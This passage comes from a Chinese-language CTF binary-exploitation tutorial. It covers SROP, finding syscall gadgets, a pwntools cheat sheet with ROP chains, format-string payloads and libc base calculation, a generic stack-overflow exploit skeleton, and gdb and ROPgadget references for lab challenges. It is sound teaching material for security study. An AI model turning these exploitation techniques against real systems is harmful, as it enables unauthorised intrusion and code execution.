核心從 \texttt{rsp} 往下讀時只會用到它認得的那些欄位 （\texttt{rip} /
\texttt{rsp} / \texttt{csgsfs}\ldots），\textbf{後面的 bytes
它不看}，所以我們不需要（也放不了）整個 \texttt{rt\_\allowbreak{}sigframe}。

實測：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; context.clear(arch=\textquotesingle{}amd64\textquotesingle{}); print(len(bytes(SigreturnFrame())))"}
\CommentTok{\# → 248   （= 0xf8，pwntools 的 frame）}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{\# 量核心那一包：在 SIGSEGV handler 裡比較「出事時的 rsp」與「核心放的 frame 起點 (=\&ucontext{-}8)」}
\NormalTok{sp at fault = 0x7ffd91c3a1e0    frame start = 0x7ffd91c39b38}
\NormalTok{=\textgreater{} 核心往下移了 \textasciitilde{}0x6a8 bytes（含 siginfo 0x80 與 FPU 狀態）}
\end{Highlighting}
\end{Shaded}
\end{quote}

\texttt{struct\ \allowbreak{}sigcontext} 的欄位順序是固定的，pwntools
幫你排好，\textbf{不要自己手刻}。

\paragraph{11.5 怎麼找 syscall
gadget}\label{ux600eux9ebcux627e-syscall-gadget}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./challenge }\KeywordTok{|} \FunctionTok{grep} \StringTok{"syscall"}
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./challenge }\AttributeTok{{-}{-}opcode}\NormalTok{ 0f05     }\CommentTok{\# syscall 的 opcode 是 0f 05}
\end{Highlighting}
\end{Shaded}

理想的是 \texttt{syscall\ \allowbreak{};\ \allowbreak{}ret}。如果只有 \texttt{syscall} 沒有
\texttt{ret}， 就得看 \texttt{syscall} 之後的指令能不能接受。

\paragraph{11.6 SROP 什麼時候比 ROP
好用}\label{srop-ux4ec0ux9ebcux6642ux5019ux6bd4-rop-ux597dux7528}

\begin{itemize}
\tightlist
\item
  沒有 \texttt{pop\ \allowbreak{}rdi} / \texttt{pop\ \allowbreak{}rsi} / \texttt{pop\ \allowbreak{}rdx}（pwn1
  就是）
\item
  需要一次設定很多暫存器
\item
  想做的 syscall 參數很多
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{12. pwntools 常用 API}\label{pwntools-ux5e38ux7528-api}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\CommentTok{\# {-}{-}{-}{-} 連線 {-}{-}{-}{-}}
\NormalTok{p }\OperatorTok{=}\NormalTok{ process(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{)                      }\CommentTok{\# 本地}
\NormalTok{p }\OperatorTok{=}\NormalTok{ process([}\StringTok{\textquotesingle{}./ld{-}linux{-}x86{-}64.so.2\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}{-}{-}library{-}path\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{])   }\CommentTok{\# 指定 ld}
\NormalTok{p }\OperatorTok{=}\NormalTok{ remote(}\StringTok{\textquotesingle{}host\textquotesingle{}}\NormalTok{, }\DecValTok{1337}\NormalTok{)                   }\CommentTok{\# 遠端}
\NormalTok{p }\OperatorTok{=}\NormalTok{ gdb.debug(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}b *main\textquotesingle{}}\NormalTok{)         }\CommentTok{\# 開 gdb}

\CommentTok{\# {-}{-}{-}{-} 送收 {-}{-}{-}{-}}
\NormalTok{p.send(}\StringTok{b\textquotesingle{}AAAA\textquotesingle{}}\NormalTok{)                }\CommentTok{\# 不換行}
\NormalTok{p.sendline(}\StringTok{b\textquotesingle{}AAAA\textquotesingle{}}\NormalTok{)            }\CommentTok{\# 加 \textquotesingle{}\textbackslash{}n\textquotesingle{}}
\NormalTok{p.sendafter(}\StringTok{b\textquotesingle{}\textgreater{} \textquotesingle{}}\NormalTok{, }\StringTok{b\textquotesingle{}AAAA\textquotesingle{}}\NormalTok{)    }\CommentTok{\# 收到提示後再送}
\NormalTok{p.sendlineafter(}\StringTok{b\textquotesingle{}\textgreater{} \textquotesingle{}}\NormalTok{, }\StringTok{b\textquotesingle{}AAAA\textquotesingle{}}\NormalTok{)}
\NormalTok{p.recv(}\DecValTok{8}\NormalTok{)                      }\CommentTok{\# 收 8 bytes}
\NormalTok{p.recvn(}\DecValTok{8}\NormalTok{)                     }\CommentTok{\# 一定要收滿 8 bytes}
\NormalTok{p.recvline()                   }\CommentTok{\# 收一行}
\NormalTok{p.recvuntil(}\StringTok{b\textquotesingle{}sh\textgreater{} \textquotesingle{}}\NormalTok{)           }\CommentTok{\# 收到指定字串為止}
\NormalTok{p.recvrepeat(}\DecValTok{2}\NormalTok{)                }\CommentTok{\# 收到 2 秒沒資料為止}
\NormalTok{p.recvall()                    }\CommentTok{\# 收到連線結束}
\NormalTok{p.interactive()                }\CommentTok{\# 交還控制權給人類}

\CommentTok{\# {-}{-}{-}{-} 打包（預設 little{-}endian） {-}{-}{-}{-}}
\NormalTok{p8(}\BaseNTok{0x41}\NormalTok{)      }\CommentTok{\# 1 byte}
\NormalTok{p16(}\BaseNTok{0x1234}\NormalTok{)   }\CommentTok{\# 2 bytes}
\NormalTok{p32(}\BaseNTok{0xdeadbeef}\NormalTok{)}
\NormalTok{p64(}\BaseNTok{0x401234}\NormalTok{)              }\CommentTok{\# ← ROP 最常用}
\NormalTok{flat([}\BaseNTok{0x401234}\NormalTok{, }\BaseNTok{0x401234}\NormalTok{]) }\CommentTok{\# 自動串接（!! 寬度看 context.arch，見下方 !!）}

\CommentTok{\# {-}{-}{-}{-} 解包 {-}{-}{-}{-}}
\NormalTok{u32(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}xef\textbackslash{}xbe\textbackslash{}xad\textbackslash{}xde}\StringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{u64(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x01\textbackslash{}x02\textbackslash{}x03\textbackslash{}x04\textbackslash{}x05\textbackslash{}x06\textbackslash{}x07\textbackslash{}x08}\StringTok{\textquotesingle{}}\NormalTok{)}

\CommentTok{\# {-}{-}{-}{-} ELF {-}{-}{-}{-}}
\NormalTok{e }\OperatorTok{=}\NormalTok{ ELF(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{)}
\NormalTok{e.symbols[}\StringTok{\textquotesingle{}main\textquotesingle{}}\NormalTok{]          }\CommentTok{\# 函式位址（未 strip 時；stripped 會 KeyError，見下方 !!）}
\NormalTok{e.plt[}\StringTok{\textquotesingle{}printf\textquotesingle{}}\NormalTok{]}
\NormalTok{e.got[}\StringTok{\textquotesingle{}printf\textquotesingle{}}\NormalTok{]}
\NormalTok{e.bss()}
\NormalTok{e.address                  }\CommentTok{\# 磁碟上的 PIE 檔是 0x0；接上 process 後才是真正的 base}
                           \CommentTok{\# （PIE 真正的 base 只能靠 leak 才知道）}

\OperatorTok{\textgreater{}} \OperatorTok{!!} \OperatorTok{**}\NormalTok{\textasciigrave{}e.symbols[}\StringTok{\textquotesingle{}main\textquotesingle{}}\NormalTok{]\textasciigrave{} 在 stripped 的檔案上會直接丟 \textasciigrave{}KeyError\textasciigrave{}}\OperatorTok{**}\NormalTok{，}
\OperatorTok{\textgreater{}}\NormalTok{ 不是回 \textasciigrave{}None\textasciigrave{}。本系列有幾題是 stripped 的（例如 pwn1、pwn7），}
\OperatorTok{\textgreater{}}\NormalTok{ 那種情況要用}\OperatorTok{**}\NormalTok{位址}\OperatorTok{**}\NormalTok{工作（\textasciigrave{}objdump }\OperatorTok{{-}}\NormalTok{d\textasciigrave{} 找），或用}
\OperatorTok{\textgreater{}}\NormalTok{ \textasciigrave{}e.symbols\textasciigrave{} }\OperatorTok{/}\NormalTok{ \textasciigrave{}e.functions\textasciigrave{} 先看看還剩什麼符號可抓。}

\NormalTok{libc }\OperatorTok{=}\NormalTok{ ELF(}\StringTok{\textquotesingle{}./libc.so.6\textquotesingle{}}\NormalTok{, checksec}\OperatorTok{=}\VariableTok{False}\NormalTok{)   }\CommentTok{\# 有附 libc 就用附的（見 4.3.1）}
\NormalTok{libc.symbols[}\StringTok{\textquotesingle{}system\textquotesingle{}}\NormalTok{]                      }\CommentTok{\# libc 檔內的 offset，例如 0x58740}
\NormalTok{libc.address }\OperatorTok{=}\NormalTok{ leaked\_printf }\OperatorTok{{-}}\NormalTok{ libc.symbols[}\StringTok{\textquotesingle{}printf\textquotesingle{}}\NormalTok{]   }\CommentTok{\# ✶ 這一行就是「算 libc base」}
\BuiltInTok{next}\NormalTok{(libc.search(}\StringTok{b\textquotesingle{}/bin/sh\textquotesingle{}}\NormalTok{))               }\CommentTok{\# /bin/sh 的位址（自動加 libc.address）}

\CommentTok{\# {-}{-}{-}{-} ROP {-}{-}{-}{-}}
\NormalTok{rop }\OperatorTok{=}\NormalTok{ ROP(e)}
\NormalTok{rop.rdi }\OperatorTok{=} \BaseNTok{0xdeadbeef}       \CommentTok{\# 自動找 pop rdi; ret}
\NormalTok{rop.call(}\StringTok{\textquotesingle{}system\textquotesingle{}}\NormalTok{, [binsh])}
\BuiltInTok{print}\NormalTok{(rop.dump())          }\CommentTok{\# 看它組出來的鏈}
\NormalTok{rop.chain()}

\CommentTok{\# {-}{-}{-}{-} Format String（pwn2 那種「printf(buf)」的題目）{-}{-}{-}{-}}
\NormalTok{context.arch }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}                 \CommentTok{\# ✶ 習慣先設：不設的話 pwntools 預設是 \textquotesingle{}i386\textquotesingle{}，}
                                       \CommentTok{\#   而 SigreturnFrame() 之類的功能需要它（見 11.4）}
\NormalTok{payload }\OperatorTok{=}\NormalTok{ fmtstr\_payload(}
    \DecValTok{8}\NormalTok{,                                 }\CommentTok{\# 我們控制的「第幾個參數」（1{-}based，要自己先量出來）}
\NormalTok{    \{}\BaseNTok{0x404010}\NormalTok{: }\BaseNTok{0x7f1234558740}\NormalTok{\},        }\CommentTok{\# \{目標位址: 要寫進去的值\}}
\NormalTok{    write\_size}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{,                 }\CommentTok{\# 想以 1 byte 為單位寫（用 \%hhn）}
    \CommentTok{\# write\_size\_max=\textquotesingle{}byte\textquotesingle{},           \# ✶ 想「保證只用 \%hhn」才要加這行（見下面 !!）}
\NormalTok{    numbwritten}\OperatorTok{=}\DecValTok{0}\NormalTok{,                     }\CommentTok{\# 在這之前已經印出幾個字元（會影響 \%n 要寫的值）}
\NormalTok{    badbytes}\OperatorTok{=}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{,                    }\CommentTok{\# 不能出現在 payload 裡的位元組}
\NormalTok{)}
\CommentTok{\# 自動量出「第幾個參數是我們控制的」：}
\CommentTok{\# autofmt = FmtStr(execute\_fmt=lambda p: (p.sendline(b\textquotesingle{}\%p\textquotesingle{}), p.recvline())[1])}
\CommentTok{\# print(autofmt.offset)   \# → 8}

\CommentTok{\# {-}{-}{-}{-} 方便函式 {-}{-}{-}{-}}
\NormalTok{cyclic(}\DecValTok{200}\NormalTok{)                }\CommentTok{\# 產生有規律的 pattern}
\NormalTok{cyclic\_find(}\BaseNTok{0x6161616b}\NormalTok{)    }\CommentTok{\# 找出 offset}
\NormalTok{SigreturnFrame()           }\CommentTok{\# SROP frame（記得先設 context.arch）}
\NormalTok{log.success(}\StringTok{\textquotesingle{}FLAG: }\SpecialCharTok{\%s}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ flag)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意
\textbf{\texttt{e.\allowbreak{}symbols{[}\textquotesingle{}\allowbreak{}main\textquotesingle{}\allowbreak{}{]}}
在 stripped 的檔案上會直接丟 \texttt{KeyError}}，不是回 \texttt{None}。
本系列有幾題是 stripped 的（例如
pwn1、pwn7），那種情況要用\textbf{位址}工作 （\texttt{objdump\ \allowbreak{}-\allowbreak{}d}
找），或先用 \texttt{e.\allowbreak{}symbols} / \texttt{e.\allowbreak{}functions}
看看還剩什麼符號可抓。
\end{quote}

\begin{quote}
※注意 \textbf{\texttt{e.\allowbreak{}address} 對「磁碟上的 PIE 檔」永遠是
\texttt{0x0}}（因為檔案裡的載入位址就是 0）。 真正的 base
只有在\textbf{行程跑起來之後}才知道，而我們能拿到的只有 leak 出來的值
------ 所以 PIE 題一定是
\texttt{pie\_\allowbreak{}base\ \allowbreak{}=\ \allowbreak{}洩漏到的程式位址\ \allowbreak{}-\allowbreak{}\ \allowbreak{}該位址在檔案內的\ \allowbreak{}offset}（見
4.3.1）。
\end{quote}

\begin{quote}
※注意 \textbf{\texttt{gdb.\allowbreak{}debug()} 需要 \texttt{tmux}（或
\texttt{screen}）}，否則 pwntools 會直接報錯。 裝一下
\texttt{sudo\ \allowbreak{}pacman\ \allowbreak{}-\allowbreak{}S\ \allowbreak{}tmux}（或
\texttt{sudo\ \allowbreak{}apt\ \allowbreak{}install\ \allowbreak{}tmux}）就能用。 另外 \texttt{input()} 需要
TTY ------ 本系列的 exploit 都刻意避開它，所以
\texttt{\textless{}\allowbreak{}\ \allowbreak{}/\allowbreak{}dev/\allowbreak{}null} 也能跑完（這也是寫自動化 exploit
的好習慣）。
\end{quote}

\begin{quote}
※重要 \textbf{\texttt{fmtstr\_\allowbreak{}payload} 的 \texttt{write\_\allowbreak{}size\_\allowbreak{}max}
預設是 \texttt{\textquotesingle{}\allowbreak{}long\textquotesingle{}\allowbreak{}}}： 所以
\texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}
\textbf{不保證}輸出 6 個 \texttt{\%\allowbreak{}hhn}，pwntools
會自動把相鄰的位址合併成 \texttt{\%\allowbreak{}hn} / \texttt{\%\allowbreak{}n} 以縮短
payload。要「強制只用 \texttt{\%\allowbreak{}hhn}」必須自己再加
\texttt{write\_\allowbreak{}size\_\allowbreak{}max=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}。
\end{quote}

\begin{quote}
※重要 \textbf{\texttt{flat()} 的寬度取決於
\texttt{context.\allowbreak{}arch}，不是自動判斷！} 沒設 \texttt{context.\allowbreak{}arch} 時
pwntools 預設是 \textbf{32-bit}，\texttt{flat({[}0x401234{]})} 只會給你
\textbf{4 bytes}（不是 8 bytes），拿去打 64-bit 的題目會整條鏈錯位。
所以\textbf{每一支 exploit 的開頭}都要先寫：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{context.arch }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}   \CommentTok{\# ← 沒寫的話 flat() / SigreturnFrame() / shellcraft 全會錯}
\end{Highlighting}
\end{Shaded}

自己驗證一下：\texttt{python3\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}"from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*;\ \allowbreak{}print(len(flat({[}0x401234{]})))"}
→ 沒設是 \texttt{4}，設了
\texttt{context.\allowbreak{}arch=\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{}} 才是
\texttt{8}。
\end{quote}

\paragraph{常用解題骨架}\label{ux5e38ux7528ux89e3ux984cux9aa8ux67b6}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\#!/usr/bin/env python3}
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\NormalTok{context.arch }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}
\NormalTok{context.log\_level }\OperatorTok{=} \StringTok{\textquotesingle{}info\textquotesingle{}}

\KeywordTok{def}\NormalTok{ start():}
    \ControlFlowTok{if}\NormalTok{ args.REMOTE:}
        \ControlFlowTok{return}\NormalTok{ remote(}\StringTok{\textquotesingle{}chal.example.com\textquotesingle{}}\NormalTok{, }\DecValTok{1337}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ process(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{)}

\NormalTok{p }\OperatorTok{=}\NormalTok{ start()}
\NormalTok{p.recvuntil(}\StringTok{b\textquotesingle{}\textgreater{} \textquotesingle{}}\NormalTok{)}

\NormalTok{payload  }\OperatorTok{=} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*} \DecValTok{72}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(}\BaseNTok{0x401234}\NormalTok{)}

\NormalTok{p.sendline(payload)}
\NormalTok{p.sendline(}\StringTok{b\textquotesingle{}cat flag.txt; id; echo DONE\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(p.recvrepeat(}\DecValTok{3}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

執行方式：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python3}\NormalTok{ exploit.py             }\CommentTok{\# 本地}
\ExtensionTok{python3}\NormalTok{ exploit.py REMOTE      }\CommentTok{\# 遠端}
\ExtensionTok{python3}\NormalTok{ exploit.py REMOTE HOST=1.2.3.4 PORT=9999}
\ExtensionTok{python3}\NormalTok{ exploit.py DEBUG       }\CommentTok{\# pwntools 除錯模式（印出每一次 send/recv）}
\VariableTok{DEBUG}\OperatorTok{=}\NormalTok{1 }\ExtensionTok{python3}\NormalTok{ exploit.py     }\CommentTok{\# ← 這個**沒有用**！pwntools 不看環境變數，只看命令列參數}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※重要 \textbf{但本系列的腳本大多自己把 \texttt{context.\allowbreak{}log\_\allowbreak{}level}
寫死了，所以照上面打看不到 debug 輸出。} 實測
\texttt{grep\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}"context.\allowbreak{}log\_\allowbreak{}level"\ \allowbreak{}pwn*/\allowbreak{}exploit.\allowbreak{}py}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
pwn1/exploit.py:51   context.log_level = "info"
pwn2/exploit.py:42   context.log_level = 'info'
pwn3/exploit.py:50   context.log_level = 'info'
pwn5/exploit.py:21   context.log_level = 'info'
pwn6/exploit.py:26   context.log_level = 'info'
pwn7/exploit.py:68   context.log_level = 'info'
pwn4/exploit.py:35   context.log_level = 'debug' if VERBOSE else 'info'   ← 唯一的例外
\end{Verbatim}

因為 \texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*} 那行\textbf{先}把 \texttt{log\_\allowbreak{}level}
設成 \texttt{debug}，腳本下一行又把它\textbf{覆蓋回 \texttt{info}}，
所以 \texttt{DEBUG} 參數等於白打（\texttt{DEBUG=1}
環境變數沒用這件事仍然是對的）。 \textbf{想看 debug
輸出，請自己動手}（三選一）：

\begin{itemize}
\tightlist
\item
  把腳本裡那行改成
  \texttt{context.\allowbreak{}log\_\allowbreak{}level\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}debug\textquotesingle{}\allowbreak{}}（最直接）；
\item
  或在\textbf{你自己寫的} exploit 開頭就寫
  \texttt{context.\allowbreak{}log\_\allowbreak{}level\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}debug\textquotesingle{}\allowbreak{}}（那行
  \texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*} 之後）；
\item
  或跑 \texttt{pwn4} ------
  它是唯一吃命令列旗標的：\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}-\allowbreak{}v}（等於
  \texttt{-\allowbreak{}\/\allowbreak{}-\allowbreak{}verbose}；實測會進入 debug 等級）。
\end{itemize}
\end{quote}

\begin{quote}
※提示 \texttt{REMOTE} / \texttt{DEBUG} / \texttt{HOST=1.\allowbreak{}2.\allowbreak{}3.\allowbreak{}4} 這些都是
pwntools 從 \texttt{sys.\allowbreak{}argv} 讀的\textbf{裸字}，
讀完還會把它們\textbf{從 \texttt{sys.\allowbreak{}argv}
移除}。所以你想自己讀命令列參數， \textbf{一定要在
\texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*} 之前讀}（\texttt{pwn5/\allowbreak{}exploit.\allowbreak{}py}
就是這樣處理 \texttt{REMOTE} 的）。
\end{quote}

\begin{quote}
※注意 一定要 \texttt{cd} 進\textbf{題目自己的目錄}再跑（例如
\texttt{cd\ \allowbreak{}pwn1/}）， 因為 exploit 用的是相對路徑 \texttt{./\allowbreak{}challenge}
/ \texttt{./\allowbreak{}service}。 在 repo 根目錄執行會看到
\texttt{{[}ERROR{]}\ \allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}challenge\textquotesingle{}\allowbreak{}\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}exist}。
或直接用 \texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh}（它會自動 cd 進各題目目錄）。
\end{quote}

\begin{quote}
※提示 例外：本系列的 \textbf{pwn2 / pwn3} 兩支 exploit 已經用
\texttt{os.\allowbreak{}path.\allowbreak{}dirname(os.\allowbreak{}path.\allowbreak{}abspath(\_\allowbreak{}\_\allowbreak{}file\_\allowbreak{}\_\allowbreak{}))}
組出題目路徑（並用 \texttt{cwd=} 指定工作目錄）， 所以\textbf{不受 cwd
影響}，從 repo 根目錄直接跑也可以（實測兩題都 PASS）。
其他題目請仍以各題 \texttt{notes.\allowbreak{}md} 的說明為準。
\end{quote}

\begin{quote}
※重要 \textbf{端序（endianness）}：x86-64 是
\textbf{little-endian}，所以 \texttt{p64(0x401040)} 產生
\texttt{40\ \allowbreak{}10\ \allowbreak{}40\ \allowbreak{}00\ \allowbreak{}…}。\textbf{但協定 / 檔案格式不一定是小端}！
pwn7 的封包長度欄位就是 \textbf{big-endian}，這時不能用
\texttt{p16(4)}（它會給你 \texttt{04\ \allowbreak{}00}）， 要自己寫
\texttt{b"\textbackslash{}\allowbreak{}x00\textbackslash{}\allowbreak{}x04"}。實際寫起來差別是這樣（pwn5
的訊框長度也是大端）：
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p16(}\BaseNTok{0x101}\NormalTok{)                    }\CommentTok{\# → b\textquotesingle{}\textbackslash{}x01\textbackslash{}x01\textquotesingle{}  小端，剛好對稱，看不出差別}
\NormalTok{p16(}\BaseNTok{0x500}\NormalTok{)                    }\CommentTok{\# → b\textquotesingle{}\textbackslash{}x00\textbackslash{}x05\textquotesingle{}  小端 ✗ 伺服器讀成 0x0500 → 卡死}
\NormalTok{p16(}\BaseNTok{0x500}\NormalTok{, endian}\OperatorTok{=}\StringTok{\textquotesingle{}big\textquotesingle{}}\NormalTok{)      }\CommentTok{\# → b\textquotesingle{}\textbackslash{}x05\textbackslash{}x00\textquotesingle{}  大端 ✓（或 (0x500).to\_bytes(2,\textquotesingle{}big\textquotesingle{})）}
\NormalTok{u16(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x05\textbackslash{}x00}\StringTok{\textquotesingle{}}\NormalTok{, endian}\OperatorTok{=}\StringTok{\textquotesingle{}big\textquotesingle{}}\NormalTok{)   }\CommentTok{\# → 0x500，讀回來也要指定大端}
\end{Highlighting}
\end{Shaded}

\begin{quote}
怎麼判斷？\textbf{看組語}：像 pwn5 那樣先把高位 byte
存進去（\texttt{shr\ \allowbreak{}ax,\allowbreak{}8}）就是大端； 直接
\texttt{mov\ \allowbreak{}WORD\ \allowbreak{}PTR\ \allowbreak{}{[}..{]},\allowbreak{}ax} 就是小端（x86 的原生順序）。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{13. gdb 除錯速查}\label{gdb-ux9664ux932fux901fux67e5}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{gdb}\NormalTok{ ./chal}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{set pagination off              \# 關掉分頁}
\NormalTok{set disassembly{-}flavor intel    \# Intel 語法（比較好讀）}
\NormalTok{b *0x401234                     \# 在指定位址下中斷點}
\NormalTok{b *main+42                      \# 只有在「沒有 strip」的檔案才能這樣寫；}
\NormalTok{                                \# 本系列大多是 stripped → 會回}
\NormalTok{                                \# "No symbol table is loaded."，請改用 b *0x401234}
\NormalTok{b *0x555555554000+0x1a7d        \# PIE 檔：先 starti 看到 base，再加 offset 下中斷點}
\NormalTok{                                \#   ↑ 那個 0x555555554000 是我「查完以後填進去的」，}
\NormalTok{                                \#     不是 gdb 幫你算的。**\textasciigrave{}$base\textasciigrave{} 不是 gdb 內建變數**，}
\NormalTok{                                \#     自己寫 \textasciigrave{}b *$base+0x1234\textasciigrave{} 會直接報}
\NormalTok{                                \#     「Argument to arithmetic operation not a number or boolean.」}
\NormalTok{                                \#     正確流程：starti → info proc mappings（或 vmmap）}
\NormalTok{                                \#     → set $base = \textless{}你看到的起始位址\textgreater{} → b *$base+0x1234}
\NormalTok{                                \#     （實測與完整範例：wp/99\_速查表.md §10）}
\NormalTok{run \textless{} input.txt                 \# 餵輸入檔（input.txt 是「你自己準備的」輸入檔，}
\NormalTok{                                \#  本系列沒有任何題目附這個檔；隨便取個名字即可，}
\NormalTok{                                \#  例如先用 python3 產生 /tmp/in.bin 再 run \textless{} /tmp/in.bin）}
\NormalTok{c                               \# continue}
\NormalTok{si / ni                         \# 單步（進入 / 不進入 call）}
\NormalTok{x/10gx $rsp                     \# 看堆疊上 10 個 8{-}byte}
\NormalTok{x/20i $rip                      \# 看 rip 附近 20 行指令}
\NormalTok{info registers                  \# 所有暫存器}
\NormalTok{p/x $rdi                        \# 印暫存器}
\NormalTok{vmmap                           \# (pwndbg) 記憶體映射，找 libc base}
\NormalTok{telescope $rsp 20               \# (pwndbg) 智慧解讀堆疊}
\NormalTok{heap / bins / vis\_heap\_chunks   \# (pwndbg) heap 相關}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 標了 \texttt{(pwndbg)} 的四條\textbf{要先裝 pwndbg}（見第 2
節），原版 gdb 沒有這些指令。
\end{quote}

\paragraph{接 remote 的程式到
gdb（沒原始檔也行）}\label{ux63a5-remote-ux7684ux7a0bux5f0fux5230-gdbux6c92ux539fux59cbux6a94ux4e5fux884c}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 方法：用 process 起本地，然後用 gdb attach}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; p=process(\textquotesingle{}./chal\textquotesingle{}); print(p.pid); input()"}
\CommentTok{\# 另一個 terminal}
\FunctionTok{gdb} \AttributeTok{{-}p} \OperatorTok{\textless{}}\NormalTok{pid}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

或用 pwntools：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p }\OperatorTok{=}\NormalTok{ gdb.debug(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{, gdbscript}\OperatorTok{=}\StringTok{\textquotesingle{}b *0x401234}\CharTok{\textbackslash{}n}\StringTok{c\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{14. 找 gadget}\label{ux627e-gadget}

\paragraph{ROPgadget}\label{ropgadget}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./chal }\KeywordTok{|} \FunctionTok{grep} \StringTok{"pop rdi"}
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./chal }\KeywordTok{|} \FunctionTok{grep} \StringTok{"syscall"}
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./chal }\AttributeTok{{-}{-}string} \StringTok{"/bin/sh"}
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./chal }\AttributeTok{{-}{-}opcode}\NormalTok{ 0f05      }\CommentTok{\# syscall}
\end{Highlighting}
\end{Shaded}

真實例子（\texttt{pwn5/\allowbreak{}homemaker}，實測輸出）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ ROPgadget {-}{-}binary ./pwn5/homemaker | grep {-}E ": pop rdi ; ret$"}
\NormalTok{0x00000000000012aa : pop rdi ; ret}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※提示 這裡的 \texttt{0x12aa} 是\textbf{檔案內的 offset}。PIE
的題目要寫成 \texttt{pie\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x12aa}（見 4.3.1）。
\end{quote}

\paragraph{ropper（可選的第二套工具）}\label{ropperux53efux9078ux7684ux7b2cux4e8cux5957ux5de5ux5177}

本文件從頭到尾都用 \texttt{ROPgadget}，它已經夠用。想多一套可以另外裝
\texttt{ropper}：

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ pacman }\AttributeTok{{-}S}\NormalTok{ ropper                }\CommentTok{\# Arch：extra/ropper 1.13.13（最推薦）}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 \textbf{不建議用 \texttt{pip} / \texttt{pipx} 裝 ropper。}
\texttt{ropper} 相依 \texttt{filebytes}，在\textbf{很新的 Python（例如
3.14）上沒有對應的 wheel}， 會在建置階段編譯失敗。用發行版套件最省事
------ 反正本系列全部只需要 \texttt{ROPgadget}， 連 \texttt{ropper}
